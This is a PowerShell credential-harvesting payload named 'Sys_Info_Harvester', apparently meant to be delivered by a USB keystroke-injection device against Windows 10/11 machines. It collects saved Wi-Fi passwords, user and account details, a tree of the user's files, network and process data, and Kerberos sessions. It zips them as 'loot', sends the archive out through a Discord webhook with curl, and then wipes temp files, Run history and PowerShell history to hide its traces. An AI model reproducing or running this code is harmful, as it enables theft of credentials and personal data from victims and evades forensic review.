######################################################################################################################################################################
#                                             |                                                                   |             .'''''.        ..||..'''''''...      #
# -Title     :Sys_Info_Harvester              |                                                                   |            / ##### \       : ||            ''.   #
# -Author    :ItsIsaac                        |                                                                   |           | ## # ## |      :.||...''''''....  '. #
# -Version   :1.0                             |                                                                   |           | #  #  # |        ||             '''' &
# -Category  :System/ User Info Grab          |       .___  __           .___                                     |            \ ##### /     /| < _>                 #
# -Target    :W 10/11                         |       |   |/  |_  ______ |   | ___________  _____    ____         |             \ ### /     / |/ < _>                #
# -Mode:     :HID                             |       |   \   __\/  ___/ |   |/  ___/\__  \ \__  \ _/ ___\        |           ..''   ''... /  |  < _>                #
#                                             |       |   ||  |  \___ \  |   |\___ \  / __ \_/ __ \\  \___        |         .'            /   | /||                  #
#                                             |       |___||__| /____  > |___/____  >(____  (____  /\___  >       |         '                 |/ ||                  #
#                                             |                      \/           \/      \/     \/     \/        |         |   |     '..     |  ||                  # 
#                                             |                                                                   |         |   |     |  '...''  ||                  #
#_____________________________________________|___________________________________________________________________|         |  |       |         ||                  #
#                                                                                                                 |          \ |       |         ||                  # 
#                                                                                                                 |          |\|       |         ||                  #
#                                                                                                                 |          \|         |        ||                  #
#                                                                                                                 |           |         |        ||                  #
#  -github.com/ibeihoffer                                                                                         |           |         |        ||                  #
#  -linked.com/in/ibeihoffer                                                                                      |          |           |       ||                  #
#                                                                                                                 |        __|           |__     ||                  #
#                                                                                                                 |       /   '.........'   \    ||                  #
#                                                                                                                 |        ''''''     ''''''     ##                  #
######################################################################################################################################################################                                                                                                                              

<#
.DESCRIPTION
        This program gathers system and user information from target Windows PC. Gathered information is formated and output to a file. That file is then exfiltrated
        to cloud storage via Discord. This program was influenced by I-Am-Jakoby's Adv-Recon, other programs, and research.
#>

######################################################################################################################################################################

# Create loot folder, file, and zip

$FolderName = "$env:USERNAME-$(get-date -f 'M/d/yyyy h:mmtt')_harvester"

$FileName = "$FolderName.txt"

$ZipFile = "$FolderName.zip"

New-Item -Path $env:tmp/$FolderName -ItemType Directory

######################################################################################################################################################################

#Discord access token (not needed in ps1?)

#$dc = ""

######################################################################################################################################################################

# Recon all user directories (/a=parsing? /f=full directory?)

tree $env:USERPROFILE /a /f >> $env:TEMP\$FolderName\FileTree.txt

######################################################################################################################################################################

function Get-fullName {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

        if($fullName -gt $null) {

                 return $fullName
 
        }else{
                 Write-Host("No full name available for...$env:UserName")
    } 

}

$fullName = Get-fullName

######################################################################################################################################################################

function Get-Email {

    $Email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName

        if($Email -gt $null) {

            return $Email

        }else{

            Write-Host("No email found for....$env:UserName")
        }
            
}

$Email = Get-Email

######################################################################################################################################################################

#Local user(s) account, name, and security id:

$LUser = Get-WmiObject -Class Win32_UserAccount | Format-Table Domain, Name, @{N='Account';E={$PSItem.Caption}}, FullName, SID | Out-String

######################################################################################################################################################################

#Local Security Authority Subsystem Service state:
#lsass takes care of security policy for the OS

######################################################################################################################################################################

function RDP-Status {

    if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	    return "RDP is Enabled" 
    } else {
	    return "RDP is NOT Enabled" 
    }

}

$RDP = RDP-Status

######################################################################################################################################################################

#UAC State:
#Referenced I-Am-Jakoby
#Need further understanding

Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }

$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 

$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name

If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notIfy" }
 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "NotIfy me only when apps try to make changes to my computer(do not dim my desktop)" } 

ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "NotIfy me only when apps try to make changes to my computer(default)" }
 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notIfy" }
 
Else{ $UAC = "Unknown" }

######################################################################################################################################################################

#Contents of startup folder

function StartUp {

$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name

    if($StartUp -gt $null) {

        return $StartUp

    }else{
        
        Write-Host("It appears there is nothing in the startup folder..")

    }

}

$StartUp = StartUp

######################################################################################################################################################################

#networks nearby or notify wifi interface is down.

function NearbyWifi {

    $NearbyWifi = (netsh wlan show networks mode=Bssid)

        if($NearbyWifi -gt $null) {

            return $NearbyWifi

        }elseif($NearbyWifi -eq ("*powered down and doesn't support*")){

            Write-Host("`nInterface Name: Wi-Fi`nThe wireless local area network interface is powered down and doesn't support the requested operation.")

        }else{

            Write-Host("No nearby wifi networks detected.")

        }

}

$NearbyWifi = NearbyWifi

######################################################################################################################################################################

#History of wifi network profiles and passwords
#referenced I-Am-Jakoby

$WifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

######################################################################################################################################################################

#Instance info

#Pub IP add
$PubAddr = Invoke-WebRequest ipinfo.io/ip -UseBasicParsing

#Local IP interface(s) info
$LocalAddr =  get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}

#MAC add
$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC

#System info
$SysInfo = Get-CimInstance CIM_ComputerSystem

#BIOS info
$BIOS = Get-CimInstance CIM_BIOSElement

##OS Info (referenced I-Am-Jakoby)
$OSInfo = Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List

#CPU Info
$CPU = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List

#GPU Info
function GPU {

$GPU = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution

    if ($GPU -ne $null) {

        return $GPU

    }else{

        echo "No GPU detected in system."

    }
}

$GPU = GPU

#Mobo Info
$MOBO = Get-WmiObject Win32_BaseBoard | Format-List

#RAM Capacity
function RamCap {
    $IntCap = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % {($_.sum / 1GB)}

    $RamCap = $IntCap

    return "" + $RamCap + " GB"
}

$RamCap = RamCap

#Get Storage Drives
#referenced I-Am-Jakoby
#need further understanding
$driveType = @{
   2="Removable disk "
   3="Fixed local disk "
   4="Network disk "
   5="Compact disk "}
   
$StorageDrives = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } | Out-String

#All drivers
$Drivers = Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion

######################################################################################################################################################################

#Devices / Tasks

#COM/ serical devices
#Referenced I-Am-Jakoby
$COMDev = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table

#Kerberos tickets = klist session?
$klist = klist sessions

#Lists scheduled tasks
$ScheduledTasks = Get-ScheduledTask

######################################################################################################################################################################

#Network Information
#Network Interfaces
$NetInt = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

#All WLAN profile names
$ALLWLAN = netsh.exe wlan show profiles | Select-String -pattern " : "

######################################################################################################################################################################

#Running Processes
$RunningProc = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName

######################################################################################################################################################################

#Active TCP Connections
$ActiveTCP = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess | Format-Table -AutoSize

######################################################################################################################################################################

#Outputs to loot file

$output = @"

######################################################################################################################################################################
#                                             |                                                                   |             .'''''.        ..||..'''''''...      #
# -Title     :Sys_Info_Harvester              |                                                                   |            / ##### \       : ||            ''.   #
# -Author    :ItsIsaac                        |                                                                   |           | ## # ## |      :.||...''''''....  '. #
# -Version   :1.0                             |                                                                   |           | #  #  # |        ||             '''' &
# -Category  :System/ User Info Grab          |       .___  __           .___                                     |            \ ##### /     /| < _>                 #
# -Target    :W 10/11                         |       |   |/  |_  ______ |   | ___________  _____    ____         |             \ ### /     / |/ < _>                #
# -Mode:     :HID                             |       |   \   __\/  ___/ |   |/  ___/\__  \ \__  \ _/ ___\        |           ..''   ''... /  |  < _>                #
#                                             |       |   ||  |  \___ \  |   |\___ \  / __ \_/ __ \\  \___        |         .'            /   | /||                  #
#                                             |       |___||__| /____  > |___/____  >(____  (____  /\___  >       |         '                 |/ ||                  #
#                                             |                      \/           \/      \/     \/     \/        |         |   |     '..     |  ||                  # 
#                                             |                                                                   |         |   |     |  '...''  ||                  #
#_____________________________________________|___________________________________________________________________|         |  |       |         ||                  #
#                                                                                                                 |          \ |       |         ||                  # 
#                                                                                                                 |          |\|       |         ||                  #
#                                                                                                                 |          \|         |        ||                  #
#                                                                                                                 |           |         |        ||                  #
#  -github.com/ibeihoffer                                                                                         |           |         |        ||                  #
#  -linked.com/in/ibeihoffer                                                                                      |          |           |       ||                  #
#                                                                                                                 |        __|           |__     ||                  #
#                                                                                                                 |       /   '.........'   \    ||                  #
#                                                                                                                 |        ''''''     ''''''     ##                  #
######################################################################################################################################################################

Full Name: $fullName

Email: $Email

Local Users:
$LUser

------------------------------------------------------------------------------------------------------------------------------

StartUp Folder Contents:
$StartUp

------------------------------------------------------------------------------------------------------------------------------

Nearby Wifi:
$NearbyWifi

Wifi Profiles:
$WifiProfiles

------------------------------------------------------------------------------------------------------------------------------

Network Interfaces:
$NetInt

All WLAN profile names:
$ALLWAN

------------------------------------------------------------------------------------------------------------------------------

Public IP Address:
$PubAddr

Local IP Address:
$LocalAddr

MAC Address
$MAC

------------------------------------------------------------------------------------------------------------------------------

**System Information**

System Info:
$SysInfo

BIOS:
$BIOS

OS Info:
$OSInfo

CPU:
$CPU

GPU:
$GPU

Motherboard:
$MOBO

System Ram Capacity:
$RamCap

Storage Drives:
$StorageDrives

------------------------------------------------------------------------------------------------------------------------------

Installed Drivers:
$Drivers

------------------------------------------------------------------------------------------------------------------------------

RDP Status:
$RDP

UAC Status:
$UAC

------------------------------------------------------------------------------------------------------------------------------

Com/ Serial Devices:
$COMDev

------------------------------------------------------------------------------------------------------------------------------

Active TCP Connections:
$ActiveTCP

------------------------------------------------------------------------------------------------------------------------------

Scheduled Tasks:
$ScheduledTasks

------------------------------------------------------------------------------------------------------------------------------

Logon Sessions:
$klist

------------------------------------------------------------------------------------------------------------------------------

Running Processes:
$RunningProc

**End**
"@

$output > $env:TEMP\$FolderName/Harvested.txt

######################################################################################################################################################################

Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZipFile

######################################################################################################################################################################

#Discord Upload
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZipFile"}

######################################################################################################################################################################

#Clean UP
#Clear temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

#Clear run history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

#Clear powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

#Clear recycle bin (not currently in use)
#Clear-RecycleBin -Force -ErrorAction SilentlyContinue
